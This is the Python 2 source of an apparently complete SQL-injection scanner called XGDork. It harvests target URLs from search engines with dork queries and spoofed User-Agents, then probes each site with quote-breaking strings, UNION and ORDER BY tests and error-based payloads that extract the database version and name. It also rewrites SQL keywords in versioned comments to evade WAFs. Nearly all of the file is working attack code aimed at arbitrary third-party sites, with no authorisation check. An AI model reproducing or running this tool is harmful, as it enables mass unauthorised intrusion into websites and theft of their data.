
#coding: iso-8859-1

######
import sys
from random import randint
from termcolor import colored
import requests

######



def     clearlist (l_list):
    
        i = 0
        while i <= len(l_list)-1:
            l_list.pop(i)
            i += 1



def     rand_agent ():

        agent_file = open('agents.txt', 'r')
        size = int(len(agent_file.readlines())-1)
        rnd_n = randint(5, size)
        agent_file.close()
        agent_file = open('agents.txt', 'r')
        user_agent = str(agent_file.readlines()[rnd_n])
        agent_file.close()
        user_agent = user_agent.replace('\n', '')

        return user_agent



def     lilo_search_engine (s_dork, i_npage, i_debug):

        i = 0
        new = ""
        urls = []
        trace_indice = "<a class=\"resulttitle\" href=\"http"
        p = 1

        while (p <= i_npage):

            i = 0
            
            print colored("\n[<Serial "+str(p)+">]", 'cyan')
            url = "https://search.lilo.org/?q="+s_dork+"&page="+str(p)
            user_agent = rand_agent()
            headers = {'User-Agent': user_agent}
            print colored("[*] User-Agent: "+user_agent, 'green')
            if (i_debug == 1):
                print ("user-agent -> "+user_agent)

            req = requests.get(url, headers=headers, cookies = {"favcolor": "Red"})
            data = req.text.encode('utf-8')

            if (i_debug == 2):
                print ("data req.get.text -> "+data)

            while (data.find(trace_indice, i) != -1):
                i = data.find(trace_indice, i)+29
                while (data[i] != '"'):
                    new += data[i]
                    i += 1
                if (i_debug == 1):
                    print ("url found -----> "+new)
                urls.append(new)
                print colored("[!] URL Found: "+new)
                new = ""

            p += 1

        if (i_debug == 1):
            print ("urls list --> ")
            print (urls)

        
        return list(urls)



def     givewater_search_engine (s_dork, i_npage, i_debug):

        i = 0
        new = ""
        urls = []
        trace_indice = "web-bing__title\" href=\"http"
        p = 1

        while (p <= i_npage):

            try:

                i = 0

                print colored("\n[<Serial "+str(p)+">]", 'cyan')
                url = "https://search.givewater.com/serp?q="+s_dork+"&page="+str(p)+"&sc=i03-9v1s5NWiP_yoZ8YxrTu4M1eFvqim_aS4F_kgIB6FdLzUgPT1FPBO7DjpkzYD0fbRieBK8-s-1dNoQBIYceJHdwQjCK-GFCDpPiVx5q1CsoRpTBcOd9wHjeiW157l9nsxYapgLPPRZSzIuD9PJzO4VJCZCJrps5T7pZ3YjXCgBPIgAFEZY0ZAALLgjkYPV1EI3MW39imm5neF9RlgE04R--uAGo5eTJOvfzpkzMyKLPPieXqrPz9pxdO0h9Ojg_I5HItb4erBg2IykQxtxD8bMYjj2UHrIqEUkFfEAeYb1wgzLzobHzGrKpnqo42Gg8OgqofpwObm_wNqaYlTkLiCOOZhbjm0Ld5901zvWaJSV2u66zVm-f53LEVfLfpYD2E8X-Y6_cmUrGYVPvM-Cviw4cg7tzrydFGB7m12zx1Q0AKmEVH2H0K9FzZ2dN2gzs4vaKv5C1-m-0EwohR72HMQBhOpPYLnWyPt9Om0O4hLCssbnGZA3KQic9xv1aKLn6iufs474ZD1ozWSeLkyQC7zRbSU7n_mvVK6UN7R6EsE3g0FNje6n6dWvh-hRx8AVnrVb5i37xIUTGdhLBovCqZ3YyJWlfrQrcylhphDNkEV6BfHWVOYyPHGUtVMpE_ud6iLYr3YJvMGb2-s7oNidHEOEO6mo8klfy-1rRG4NNzPTuebO4C7DNZMMnZ7yvinG_weH4lrLZYJBbiWL50W0AAhPoqJKpo82UMtzzdl-ElldG-iS7h0geWYCbXyuL6_b4Is1MDFgURapXvW0CiWllc8vXacnPUiMwUwjGd9-8tUzeJFlPIIP1-mqhWVVSgZ7c1c50bxwPV9nkG-DJIhRT5xmo5lTP7Kr2NtYSVh82c6m-Fr72E4IdsJLuLWOFqsYZIp34WOt2boMmY8aHc5gsqJCVdbY2u8C98RfNs9zbVK0RblCqO9bG9nayzJS8Bq96xx14M4GVOiaz4WZ733uxeV9I7pTRmvrpJ2iGgx2G1Na3Z9tBzYVCjAwckBKXdXvJK3J-fAdYBSkMNqDF_35SyQpKMcaHhGlY8Mss_qlRlzdAFN-KHyQFYAudK2YC1D2o_EzMLJ6ugZsJc99xgljIP66d3K7GsN4l-uRui6OC7J9B0aiqDaJBpPO3E-q4sgSC2eXXgHchiRcbRyX6vgWcX13m-LCdRtbBTM-R496AwEM3R-z2N8flJyPAxGUIKohqS2MxfCHpkihZMtjnsORsTeVUzvEuUE6oqKiKR2zoxbaJ3q2shii8HH3IIotkZ_dsSo3uOW2pYYfIP7r_dcDzE2bantinE3G9g0wlfiSAeBCM6sZJTdVnRRhk3wFBovLkLNNxpW-NgTgNW7jsofQyXyDJxKg848O6d2Qzv1ip9wy7IsfqAQ3XW-elClobg94vyK5OdQsGhe-SGw0RxZIYRVeX2KTT6PWynPpIWgdKpmCtVZfowZrwLi_akIluvUirP7DqpHE8ICiHVtib4itzvn2QGgC1d33bSpFlXcoczGYkhu1WLQOCLYt6QmviekLtAXSnoV9G7Pmg2pYBQ8nPkcWUZ0cqIYlupYkh8z42nH43Z5hDnrUHtPAxt7gE_o-V0SYDleMZDp8ncWkkXck9PCmaHbh02zO_SsNLMJ48N0OljjOZL0fALCfDnYC6pAKvl-lmRIWK8e4L6OmarexU7zGtkHHoM631qwJjdsAu7brLiJS1WirtNgsgEB9KGsBN-6O-P8HaXSE2rNnIJAz3yPwKZKzma2-IXpCtmp7BC-DkxB6CHXmoErgrNoP81Oauhx8pU9ZRJEkmC-4hEvWtjALz9zLi65jyr1PTO5mwohHDRqIhqjBk-LZhpaLJqsIU8EVfYreGMBIw"
                user_agent = rand_agent()
                headers = {'User-Agent': user_agent}
                print colored("[*] User-Agent: "+user_agent, 'green')
                if (i_debug == 1):
                    print ("user-agent -> "+user_agent)

                req = requests.get(url, headers=headers, cookies = {"favcolor": "Red"})
                data = req.text.encode('utf-8')

                if (i_debug == 2):
                    print ("data req.get.text -> "+data)

                while (data.find(trace_indice, i) != -1):
                    i = data.find(trace_indice, i)+23
                    while (data[i] != '"'):
                        new += data[i]
                        i += 1
                    if (i_debug == 1):
                        print ("url found -----> "+new)
                    urls.append(new)
                    print colored("[!] URL Found: "+new)
                    new = ""


            except requests.exceptions.ConnectionError:
                print colored(" [-] Request Error, ignored ... ", 'cyan')
            except requests.exceptions.TooManyRedirects:
                print colored(" [-] Request Error, ignored ... ", 'cyan')
            except requests.exceptions.ReadTimeout:
                print colored(" [-] Request Timeout, ignored ... ", 'cyan')

            p += 1

            if (i_debug == 1):
                print ("urls list --> ")
                print (urls)


        return list(urls)


def     webcrawler_search_engine (s_dork, i_npage, i_debug):

        i = 0
        new = ""
        urls = []
        trace_indice = "title\" href=\""
        p = 1

        while (p <= i_npage):
            try:
                i = 0

                print colored("\n[<Serial "+str(p)+">]", 'cyan')
                url = "https://www.webcrawler.com/serp?q="+s_dork+"&page"+str(p)+"&sc=j2CJ-kiroG5uG0eULxdYivaT1cI-0HN7jRIHRM-8-8coMszVKI8XOYxsdpeyNlmMGv7pPkcMvf6SXakfjpTD03cHjt74yTiEeHX3viYm3rp84KfcaFTfhH-S_QmF8EMmnR_Y1F5pUOZUDTldnMoR7PS7ohd4DDA3oX-NrM_Z0MRM9QM5dyDt7p-0hlz76k3hMdCSNV8jHtZHPKe2q8ccZuhOqvMiMHgk3gQ47DKCtciMAntt-mLlRr4grECqHDx8-lslzYfCItV6CG2HzeM2pWWXRpZssxe-DfUjp6m9hVpUtj20JBnmDsdUtbMQhPIgRaf3B2-sog-gRN0tmvUrHdNzoHA9xn0upXaw11wFIo7eejkvIl31ooarBTJsdqFttT44lQOuZQmJYYGtZW8dd-2TeYNn-Ki9Ufpw6jYSw_Piq0HvbOYR-XNR4z2UMBlfQ6G9vhz-8PvMMA_pT30U5mgrO7Y4rRt59PR6tBu9FfG9_-EDrBHTKOpLcTVjzf55b6d22KL3wseTSbsCqICyvOxuoRa6TWBJvBnH30g9cQfXVLw5L0mPPHzURyPmhKA3hnsutT9MiKVurtGQvZaCeaxaRlvlMvo0cd9y5oeghNPnUzpou3JJz_hbyG3m46vKHanqHakzSdpfHFfCClM4Nrh6M0EfdMdx-kGgkD-m2kKKqc7xdw-OOnetWOuF-2psv4pb9ZBMTtVt24EiSpkeaxyDVx-4BobeChSB0fMzNCLzh3NOtXoDEzIPOjak62NZJ8vl7sWwbsnPojApADXDZEDJ0dDjZFZD1OlY1bCZZ5GlGMAwCWZK78ObzDUdxBkgqokuPCXCWln9SwF_HdNGNyBlGwt4n15NCxxPo1DfWONrujC0VgOOxIwVo8EddOELXjEQIO7DQxhnAwIjgAMxXT39Q9uy1hQXgyTvTxPHNsxJslj7ufJifUAQIFGl9_z8n_5avbbBeAF_F0dJQvyolKviKMaErzQYXQbNhI0OARVg9AwzXUggI_pUKitprtsWq8__EL_JM1g6mSWXuP7tEIOucJ9mNe7xqFlBrNMZZFeebbJHLMH9t5t1-QScyfEzh4Z302OSC1wbaW9S3CX4gOpSYG3yh1SZPkrgJs80qh3adghQoKV7NkS0s8MXvkNSp3PvDP-JVCdzgpju4S5V_PdHhirmhPXwP3UU2k9ZSCJ8C6HuuKOoAnKGEMdkcbDm2kowHHAnG6HqDyO81p0mgkPaKb6G1Ny8leNbl9UCa9DF8-_LTh3jIUZxQBtrwBxyiwZnR2WZBPOFKpYmgAPHL09tFAQY7jJFpt_hiI3EJwCBUmjfrGzDlwLVHYA4yU3l4b8RIxSkkeHqOFSWLqs7mVanxpcUXJFZmo_mNsLYrt5kOnpgk7G1xxrN0b-giIVgc0aeGTUBziD5ONzj0lXNZ3ufoLbZYgj3L8rptnCFrUyVmfaQRqcRmA7ecWaQzrQxXygQZvuUxtr3hmYde6T36IZAoN2SuYL7OpH6P_e5j_ccY73DBNDgQ42AIkV5I8Qjkw9n4qb2JGVkcMjkqyFh6ViDImK0Dsx4h_8HQfxnWq67v2tIetmc2e35SgBm_HvorpIsRVsuWZcvfBkfNBGk8mBw_AjV5LOTp5eNUbtpM_AIwJC6PXEKB8bqAYScn5JUthx8nCn7cmOC-Xi8ss1AeZsaE5HsC7DLpz3k0qs-Bc_gqRA09mZkyw5QOA-sEk38TTV-xpP9rn_if6j03JYFwIMASGADPv7Gp-QU3PhiUIwmXhBfyLNs7z_Bfmf_h2wBblEyOPUsHCnoG1pqB90xTqAiO1nyoJc02Jsa25MYvYmCbSCxUEvAuThEj4BLhqW6F0hw9uS2Hjtl8bZAPDPxfL9wOw"

                user_agent = rand_agent()
                headers = {'User-Agent': user_agent}
                print colored("[*] User-Agent: "+user_agent, 'green')
                if (i_debug == 1):
                    print ("user-agent -> "+user_agent)

                req = requests.get(url, headers=headers, cookies = {"favcolor": "Red"})
                data = req.text.encode('utf-8')

                if (i_debug == 2):
                    print ("data req.get.text -> "+data)

                while (data.find(trace_indice, i) != -1):
                    i = data.find(trace_indice, i)+13
                    while (data[i] != '"'):
                        new += data[i]
                        i += 1
                    if (i_debug == 1):
                        print ("url found -----> "+new)
                    urls.append(new)
                    print colored("[!] URL Found: "+new)
                    new = ""

            except requests.exceptions.ConnectionError:
                print colored(" [-] Request Error, ignored ... ", 'cyan')
            except requests.exceptions.TooManyRedirects:
                print colored(" [-] Request Error, ignored ... ", 'cyan')
            except requests.exceptions.ReadTimeout:
                print colored(" [-] Request Timeout, ignored ... ", 'cyan')
            p += 1

            if (i_debug == 1):
                print ("urls list --> ")
                print (urls)


        return list(urls)



def     urlslist_filter (list_urls, list_filter):
    
        i = 0
        y = 0
        size_urls = len(list_urls)
        size_filter = len(list_filter)
        lock = 0
        
        while (i < size_urls):
            lock = 0
            y = 0 
            while(y < size_filter):
                if (list_urls[i].find(list_filter[y]) != -1):
                    list_urls.pop(i)
                    size_urls = len(list_urls)
                    if (i != 0):
                        i -= 1
                    lock = 1
                y += 1
            if (lock != 1):
                i += 1

        return list(list_urls)


def     focpa (list_urls, s_param):
        
        i = 0
        lock = 0
        size_list = len(list_urls)

        while (i < size_list):
            lock = 0
            if (list_urls[i].find(s_param) == -1):
                list_urls.pop(i)
                size_list = len(list_urls)
                lock = 1
                if (i != 0):
                    i -= 1
            if (lock != 1):
                i += 1

        return list(list_urls)



def     listofile (list_urls, s_outfile, s_dork, i_mode):

        i = 0
        size_list = len(list_urls)

        if (i_mode == 1):
            s_outfile += "-URLS_FOUND"
        if (i_mode == 2):
            s_outfile += "-URLS_VULNERABLE"
        nfile = open(str(s_outfile).replace('\n', '').replace(' ', ''), 'w')
        nfile.write("<> --- XGDork result ["+s_dork+"] --- <>\n")

        while (i < size_list):
            nfile.write(str(list_urls[i]).replace('[', '').replace(']', '').replace("'", '').replace(',', '')+'\n')
            i += 1
        
        nfile.close()



def     sbws (string):

        string = string.replace(" ", "+")
        string = string.replace("UNION", "/*!50000UnIoN*/")
        string = string.replace("ORDER", "/*!50000OrDeR*/")
        string = string.replace("GROUP_CONCAT", "/*!50000GrOuP_CoNcAt*/")
        string = string.replace("CONCAT", "/*!50000CoNcAt*/")
        string = string.replace("CHAR", "/*!50000ChAr*/")
        string = string.replace("FROM", "/*!50000FrOm*/")
        string = string.replace("WHERE", "/*!50000WhErE*/")
        string = string.replace("RAND", "/*!50000RaNd*/")
        string = string.replace("FLOOR", "/*!50000FlOoR*/")
        string = string.replace("HEX", "/*!50000HeX*/")
        string = string.replace("UNHEX", "/*!50000UnHeX*/")
        string = string.replace("LIMIT", "/*!50000LiMiT*/")
        string = string.replace("ELT", "/*!50000ElT*/")
        string = string.replace("SLEEP", "/*!50000SlEeP*/")
        string = string.replace("SELECT", "/*!50000SeLeCt*/")
        string = string.replace("COUNT", "/*!50000CoUnT*/")
        string = string.replace("@@version", "/*!50000@@VeRsIoN*/")
        string = string.replace("version()", "/*!50000VeRsIoN()*/")
        string = string.replace("database()", "/*!50000DaTaBaSe()*/")
        string = string.replace("TABLE_NAME", "/*!50000TaBlE_NaMe*/")
        string = string.replace("COLUMN_NAME", "/*!50000CoLuMn_NaMe*/")
        string = string.replace("INFORMATION_SCHEMA.TABLES", "/*!50000InFoRmAtIoN_ScHeMa.TaBlEs*/")
        string = string.replace("INFORMATION_SCHEMA.COLUMNS", "/*!50000InFoRmAtIoN_ScHeMa.CoLuMnS*/")
        string = string.replace("INFORMATION_SCHEMA.PLUGINS", "/*!50000InFoRmAtIoN_ScHeMa.PlUgInS*/")
        string = string.replace("TABLE_SCHEMA", "/*!50000TaBlE_ScHeMa*/")
        string = string.replace("GROUP", "/*!50000GrOuP*")
        string = string.replace("LIKE", "/*!50000LiKe*/")
        string = string.replace("BY", "/*!50000By*/")
        string = string.replace("CONCAT_WS", "/*!50000CoNcAt_Ws*/")
        string = string.replace("HAVING", "/*!50000HaViNg*/")
        string = string.replace("MIN", "/*!50000MiN*/")
        string = string.replace("CAST", "/*!50000CaSt*/")
        string = string.replace("AS", "/*!50000As*/")
        string = string.replace("CHAR", "/*!50000ChAr*/")
        string = string.replace("AND", "/*!50000AnD*/")
        string = string.replace("OR", "/*!50000Or*/")
        
        string = string.replace("10000", "/*!5000010000*/")
        string = string.replace("-300", "/*!50000-300*/")


        return string


def     nodata_stress (url, s_SQLi):

        i = 0
        f = 0
        size_url = 0
        nurl = ""

        f = url.find(s_SQLi, 0)+len(s_SQLi)
        while (i < f):
            nurl += url[i]
            i += 1
        
        return str(nurl)



def     turing_rangeUS (nc_c, id_c, s_data):
        ndata = ""
        i = 1
        while (i <= nc_c):
            if (i == nc_c):
                if (s_data != '' and i == id_c):
                    ndata += str(s_data)
                else:
                    ndata += str(i)
            else:
                if (s_data != '' and i== id_c):
                    ndata += str(s_data)+","
                else:
                    ndata += str(i)+","
            i += 1

        return ndata



def     block_cutter (string, int_start, int_end):

        newd = ""

        while (int_start <= int_end):
            newd += string[int_start]
            int_start += 1
        return newd



def     dump_data (data_req):

        s = 0
        e = 0

        new = block_cutter(data_req, (data_req.find("(^#^)")+5), (data_req.find("(V#V)")-1))

        if (new == ""):
            new = block_cutter(data_req, (data_req.find("FUNCTION ")+9), (data_req.find(".dabatase ")-1))

        return str(new)



def     GPP_Marvin (list_urls, s_SQLi, i_debug, i_timeout):
        
        i = 0
        y = 0
        size_list = len(list_urls)
        nurls = []
        urlsvulnerable = []
        waf = 0
        
        SQLi_trace = ["where clause", "MySQL", "SQL", "sql", "SQL syntax", "Warning:", "Invalid argument supplied for", "Notice: Undefined variable: ", "supplied argument is not a valid MySQL result resource in", "valid MySQL result", "Incorrect syntax near", "Incorrect parameter count in the call to native function ", "You have an error in your SQL syntax", "mysql_num_rows(): ", "mysql_num_row(): ", "mysql_fetch_array(): ", "mysql_query(): ", "mysql_result(): ", "Unknown(): ", "array_merge(): ", "require(): ", "MySQL Error: ", "SQL Error: ", "Unable to jump to row", "Session halted.", "Access denied for", "ODBC SQL Server Driver", "argument should be an array in", " expects parameter 1 to be resource, boolean given in ", "array_key_exists()", "parse_ini_file", "SAFE MODE Restriction in effect.", "include_once", "file_get_contents", "fetch_object()"]


        size_ST = len(SQLi_trace)
        terms = []
        level = 0

        #user_agent = rand_agent()
        #headers = {'User-Agent': user_agent}
        if (i_debug == 1):
            print ("user-agent -> "+user_agent)
        while (i < size_list):
            terms[:] = []
            level = 0
            y = 0
            waf = 0
            dump = 0
            nodump = 0

            user_agent = rand_agent()
            headers = {'User-Agent': user_agent}

            eurl = str(list_urls[i]).replace('[', '').replace(']', '').replace(',', '')
            
            #print colored("\n[GPP Marvin ²] work on "+eurl, 'cyan', attrs=['reverse'])
            print colored("\n[GPP Marvin ²] work on "+eurl, 'cyan', attrs=['reverse', 'blink', 'bold'])
            print colored("[*] User-Agent: "+user_agent, 'green')            
            print colored("[*] Simple security detection ... ", 'cyan')
            try:

            # ------ detect security ------
                burl = eurl
                burl = nodata_stress(eurl, s_SQLi)
                burl += "1984 AND CONCAT(CHAR(088,071,068,079,082,075,013,010))"

                req = requests.get(burl, headers=headers, timeout=i_timeout)
                data = req.text.encode('utf-8')

                if (data.find("Mod_Security") != -1 or data.find("You don't have permission ") != -1 or data.find("Security Incident Detected") != -1 or data.find("Your request was blocked") != -1 or data.find("suspicious") != -1 or data.find("blocked") != -1 or data.find("Request denied") != -1):
                    print colored("[!] URL protected by a [waf] or other security !!! ", 'red')
                    waf = 1

            # ------ ------ ------            
            # ------ QUOTES ------
                print colored("[*] Stress URL ", 'cyan')
                burl = eurl
                burl += "%%2727"

                if (i_debug == 1):
                    print ("burl -> "+burl)
            

                req = requests.get(burl, headers=headers, timeout=i_timeout)           
                data = req.text.encode('utf-8')
    
                while (y < size_ST):
                    if (data.find(SQLi_trace[y]) != -1):
                        terms.append(SQLi_trace[y])
                        if (i_debug == 1):
                            print ("vulnerable test -> "+burl+" / "+str(SQLi_trace[y]))
                    y += 1
            
                burl = nodata_stress(eurl, s_SQLi)
                burl += "o;"
                if (i_debug == 1):
                    print ("URL -> "+burl)
            
                req = requests.get(burl, headers=headers, timeout=i_timeout)
                data = req.text.encode('utf-8')
                y = 0

                while (y < size_ST):
                    if (data.find(SQLi_trace[y]) != -1):
                        terms.append(SQLi_trace[y])
                        if (i_debug == 1):
                            print ("vulnerable test -> "+burl+" / "+str(SQLi_trace[y]))
                    y += 1


                terms = list(set(terms))
                level = (len(terms)*3)
                if (len(terms) == 0):
                    print colored("[!] URL is insignificant to stress ", 'red')
                else:
                    print colored("[!] Stress works on URL ", 'green')

            # ------ ------ ------
            # ------ Forcing / Dump -------
                print colored("[*] Forcing URL" , 'cyan') 
                burl = nodata_stress(eurl, s_SQLi)
                burl += "-300 UNION SELECT "+str(turing_rangeUS(300, 155, "database()"))+" --"

                if (waf == 1):
                    burl = sbws(burl)

                req = requests.get(burl, headers=headers, timeout=i_timeout)
                data = req.text.encode('utf-8')

                if (data.find("The used SELECT statements ") != -1 or data.find("different number of columns") != -1):
                    print colored("[!] This technique is potentially feasible   - ERROR-BASED -", 'green')
                    level += 10
                    dump = 1

                burl = nodata_stress(eurl, s_SQLi)
                burl += "10000 ORDER BY 10000 --"

                if (waf == 1):
                    burl = sbws(burl)

                req = requests.get(burl, headers=headers, timeout=i_timeout)
                data = req.text.encode('utf-8')

                if (data.find("Unknown column '") != -1 or data.find("' in 'order clause'") != -1 or data.find("mysql_num_rows():") != -1 or data.find("mysql_num_row():") != -1):
                    print colored("[!] This technique is potentially feasible   - UNION-BASED -", 'green')
                    level += 10

            # ------ BRUTAL DUMP ------
                if (dump == 1):
                    print colored("[*] Brutal Dump", 'cyan')
                    # DUMP 1 S
                    burl = nodata_stress(eurl, s_SQLi)
                    burl += "1 OR 1984 GROUP BY CONCAT(0x28,0x5e,0x23,0x5e,0x29,version(),0x28,0x56,0x23,0x56,0x29,floor(rand(0)*2)) HAVING MIN(0) OR 1 --"
                
                    if (waf == 1):
                        burl = sbws(burl)

                    req = requests.get(burl, headers=headers, timeout=i_timeout)
                    data = req.text.encode('utf-8')
                
                    # DUMP 2 S
                    if (data.find("(^#^)") == -1):
                        dump = 20
                        burl = nodata_stress(eurl, s_SQLi)
                        burl += "1 OR (SELECT 1984 FROM (SELECT COUNT(*),CONCAT(0x28,0x5e,0x23,0x5e,0x29,version(),0x28,0x56,0x23,0x56,0x29,(SELECT(ELT(1984=1984,1))),FL0OR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --"

                        if (waf == 1):
                            burl = sbws(burl)

                        req = requests.get(burl, headers=headers, timeout=i_timeout)
                        data = req.text.encode('utf-8')
                        # DUMP 3 S
                        if (data.find("(^#^)") == -1):
                            dump = 30

                            burl = nodata_stress(eurl, s_SQLi)
                            burl += "1 OR (SELECT 1984 FROM (SELECT COUNT(*),CONCAT(0x28,0x5e,0x23,0x5e,0x29,version(),0x28,0x56,0x23,0x56,0x29,CEILING(RAND(0)*CONVERT(2,BINARY)))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --"

                            if (waf == 1):
                                burl = sbws(burl)

                            req = requests.get(burl, headers=headers, timeout=i_timeout)
                            data = req.text.encode()

                            if (data.find("(^#^)") == -1):
                                print colored("[!] Brutal Dump failed ! ", 'red')
                                nodump = 1

                        elif (dump == 30):
                            tmp_version = dump_data(data)
                            burl = nodata_stress(eurl, s_SQLi)
                            burl += "1 OR (SELECT 1984 FROM (SELECT COUNT(*),CONCAT(0x28,0x5e,0x23,0x5e,0x29,database(),0x28,0x56,0x23,0x56,0x29,CEILING(RAND(0)*CONVERT(2,BINARY)))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --"
                            if (waf == 1):
                                burl = sbws(burl)
                            req = requests.get(burl, headers=headers, timeout=i_timeout)
                            data = req.text.encode('utf-8')
                            tmp_database = dump_data(data)
                            if (i_debug):
                                print ("debug BD 3 VERSION & DATABASE -> "+tmp_version+" "+tmp_database)
                            print colored("[*] Infos obtained brutally:", 'green')
                            print colored("     # [Version]  : "+tmp_version, 'yellow')
                            print colored("     # [Database] : "+tmp_database, 'yellow')
                            print colored("     # [Payload]  : "+burl, 'yellow')

                        # DUMP 3 E
                    elif (dump == 20):
                        tmp_version = dump_data(data)
                        burl = nodata_stress(eurl, s_SQLi)
                        burl += "1 OR (SELECT 1984 FROM (SELECT COUNT(*),CONCAT(0x28,0x5e,0x23,0x5e,0x29,database(),0x28,0x56,0x23,0x56,0x29,(SELECT(ELT(1984=1984,1))),FL0OR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --"
                        if (waf == 1):
                            burl = sbws(burl)
                        req = requests.get(burl, headers=headers, timeout=i_timeout)
                        data = req.text.encode('utf-8')
                        tmp_database = dump_data(data)
                        if (i_debug == 1):
                            print ("debug BD 2 VERSION & DATABASE -> "+tmp_version+" "+tmp_database)
                        print colored("[*] Infos obtained brutally:", 'green')
                        print colored("     # [Version]  : "+tmp_version, 'yellow')
                        print colored("     # [Database] : "+tmp_database, 'yellow')
                        print colored("     # [Payload]  : "+burl, 'yellow')

                    # DUMP 2 E

                    if (dump == 1):
                        tmp_version = dump_data(data)
                        burl = nodata_stress(eurl, s_SQLi)
                        burl += "1 OR 1984 GROUP BY CONCAT(0x28,0x5e,0x23,0x5e,0x29,dabatase(),0x28,0x56,0x23,0x56,0x29,floor(rand(0)*2)) HAVING MIN(0) OR 1 --"
                        if (waf == 1):
                            burl = sbws(burl)
                        req = requests.get(burl, headers=headers, timeout=i_timeout)
                        data = req.text.encode('utf-8')

                        tmp_database = dump_data(data)
                        if (i_debug == 1):
                            print ("debug BD 1 VERSION & DATABASE -> "+tmp_version+" "+tmp_database)
                        print colored("[*] Infos obtained brutally:", 'green')
                        print colored("     # [Version]  : "+tmp_version, 'yellow')
                        print colored("     # [Database] : "+tmp_database, 'yellow')
                        print colored("     # [Payload]  : "+burl, 'yellow')
                    # DUMP 3 E

            #------ ------ ------            

                if (level > 0):
                    print colored("[!] vulnerable URL [!]", 'green')
                    print colored("       Parser LvL: "+str(level), 'cyan')
                    terms = list(set(terms))
                    if (i_debug == 1):
                        print ("Terms found -> : "+str(terms))
                    urlsvulnerable.append(eurl)
                    print colored("       term(s) found overview : "+str(terms).replace('[', '').replace(']', '').replace(',', ' '), 'green')

                if (len(terms) == 0):
                    print colored("Grrr ...Marvin is not happy :( ", 'red')
                print ('\n')
         
                i += 1

            except requests.exceptions.ConnectionError:
                print colored("[-] Request Error, ignored ... \n", 'cyan')
                i += 1
            except requests.exceptions.TooManyRedirects:
                print colored("[-] Request Error, ignored ... \n", 'cyan')
                i += 1
            except requests.exceptions.ReadTimeout:
                print colored("[-] Request Timeout, ignored ... \n", 'cyan')
                i += 1
            except requests.exceptions.InvalidSchema:
                print colored("[-] Request Error, ignored ... \n", 'cyan')
                i += 1

        return list(urlsvulnerable)




def     rand_dork ():

        agent_file = open('xdorks.txt', 'r')
        size = int(len(agent_file.readlines())-1)
        rnd_n = randint(5, size)
        agent_file.close()
        agent_file = open('xdorks.txt', 'r')
        user_agent = str(agent_file.readlines()[rnd_n])
        agent_file.close()
        user_agent = user_agent.replace('\n', '')

        return user_agent




def     virax_search_engine (s_dork, i_npage, i_debug, s_SQLi, s_outfile, i_timeout):

        i = 0
        urls = []
        
        #urls = list(set(webcrawler_search_engine(s_dork, i_npage, i_debug)) + set(givewater_search_engine(s_dork, i_npage, i_debug) + set(lilo_search_engine(s_dork, i_npage, i_debug))))
        urls = list(set(lilo_search_engine(s_dork, i_npage, i_debug)))


        if (i_debug == 1):
            print ("--- concatenated and sorted lists ---> ")
            print (urls)

        file_txt = open('urlsfilter.txt', 'r')
        filter_list = file_txt.readlines()
        file_txt.close()          

        filter_list = [element.replace('\n', '') for element in filter_list]
        
        if (i_debug == 1):
            print ("no filtered urls ---> ")
            print (urls)

        urls = urlslist_filter(urls, filter_list)

        if (i_debug == 1):
            print ("filtered urls ---> ")
            print (urls)
        
        if (s_SQLi != ""):
            if (i_debug == 1):
                print ("urls no focpa ---> ")
                print (urls)

            urls = focpa(urls, s_SQLi)

            if (i_debug == 1):
                print ("urls focpa ---> ")
                print (urls)

        print colored("\n___ Urls Found "+str(len(urls))+" save in ["+s_outfile+"-URLS_FOUND] ___", 'cyan')
        
        if (s_outfile != ""):
            listofile(urls, s_outfile, s_dork, 1)

        if (s_SQLi != "" and i_timeout != 0):
            urls_vulnerable = []
            urls_vulnerable = GPP_Marvin(urls, s_SQLi, i_debug, i_timeout)

            if (s_SQLi != "" and len(urls_vulnerable) != 0):
                listofile(list(urls_vulnerable), s_outfile, s_dork, 2)
                print colored("\n\n___ Urls Found "+str(len(urls_vulnerable))+" save in ["+s_outfile+"-URLS_VULNERABLE] ___", 'cyan')
                print colored("[!] You made Marvin happy, congratulations ! ", 'green')
                print colored("[!] Check if they are not fake positive ! \n\n", 'red')

            else:
                print colored("[!] the list is empty, Marvin goes back to his depression ! \n\n", 'red')

        elif (s_SQLi != "" and i_timeout == 0):
            print colored("[!] Error, You must set a timeout with SQLi e,g: --timeout 6 or -t 6", 'red')
            exit()
        else:
            print colored("[!] Your research is carried out, but Marvin would have liked you to use the ('--SQLi' and '--timeout') options", 'green')


      
